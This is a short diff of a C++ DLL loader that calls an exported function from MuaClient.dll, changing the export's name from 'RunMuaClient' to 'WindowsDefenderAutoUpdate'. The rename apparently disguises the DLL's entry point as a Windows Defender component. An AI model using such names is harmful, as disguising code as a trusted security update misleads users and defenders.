@@ -9,7 +9,7 @@ typedef void(*FUNC)();
 int main()
 {
 	HINSTANCE  hDll = LoadLibrary(L"MuaClient.dll");
-	FUNC pfnRunMuaClient = (FUNC)GetProcAddress(hDll, "RunMuaClient");
+	FUNC pfnRunMuaClient = (FUNC)GetProcAddress(hDll, "WindowsDefenderAutoUpdate");
 	pfnRunMuaClient();
 	FreeLibrary(hDll);
 }
